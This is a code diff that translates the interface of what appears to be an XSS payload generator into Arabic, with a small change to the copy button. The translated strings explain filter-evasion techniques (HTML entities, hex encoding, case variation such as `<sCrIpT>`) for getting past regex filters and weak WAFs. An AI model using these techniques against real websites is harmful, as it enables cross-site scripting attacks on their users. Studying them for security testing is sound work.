     } else if (filterType === "htmlentity") {
-      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (HTML Entity):</strong> Characters are converted to HTML entities (e.g., `&#60;` for `<`). If the backend framework decodes HTML entities before placing them into a vulnerable sink, this bypasses regex filters.";
+      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (HTML Entity):</strong> تم تحويل الرموز الحساسة (مثل `<` أو `>`) إلى كيانات HTML. تتخطى هذه التقنية فلاتر الـ Regex إذا كان النظام يقوم بفك تشفير هذه الكيانات لاحقاً وعرضها في الصفحة.";
     } else if (filterType === "hex") {
-      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (Hex Encoding):</strong> Characters are represented by their hexadecimal values. Often used to evade poorly configured WAFs that don't normalize input.";
+      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Hex Encoding):</strong> تم تحويل الأحرف إلى قيمها بالنظام السداسي عشر (Hex). تُستخدم هذه التقنية لخداع فلاتر الحماية الضعيفة التي لا تقوم بتوحيد ومعالجة المدخلات جيداً.";
     } else if (filterType === "casevar") {
-      return "\n\n<strong style='color:var(--accent-cyan)'>Filter Evasion (Case Variation):</strong> Alternates uppercase and lowercase letters. Bypasses filters that only block exact matches like `<script>` but fail to block `<sCrIpT>`.";
+      return "\n\n<strong style='color:var(--accent-cyan)'>تخطي الحماية (Case Variation):</strong> تم تغيير حالة الأحرف بين الكبيرة والصغيرة بشكل عشوائي (مثلاً `<sCrIpT>`). هذا الأسلوب يتخطى الفلاتر التي تمنع كتابة `<script>` بالحروف الصغيرة فقط.";
     }
     return "";
   }
@@ -362,17 +362,17 @@ document.addEventListener("DOMContentLoaded", () => {
       outputCode.parentElement.style.transform = "scale(0.98)";
       setTimeout(() => outputCode.parentElement.style.transform = "scale(1)", 150);
     } else {
-      outputCode.textContent = "Error: Payload combination not found.";
-      outputExplanation.textContent = "Please select different parameters.";
+      outputCode.textContent = "خطأ: لم يتم العثور على هذا الـ Payload.";
+      outputExplanation.textContent = "الرجاء اختيار مجموعة أخرى من الخصائص.";
     }
   });
 
   btnCopy.addEventListener("click", () => {
     const textToCopy = outputCode.textContent;
-    if (textToCopy && textToCopy !== "// Select options and click Generate...") {
+    if (textToCopy && textToCopy !== "// Select options and click Generate..." && !textToCopy.startsWith("خطأ")) {
       navigator.clipboard.writeText(textToCopy).then(() => {
         const originalText = btnCopy.innerHTML;
-        btnCopy.innerHTML = "<i class='bx bx-check'></i> Copied!";
+        btnCopy.innerHTML = "<i class='bx bx-check'></i> تم النسخ!";
         btnCopy.style.color = "var(--accent-green)";
         setTimeout(() => {
           btnCopy.innerHTML = originalText;
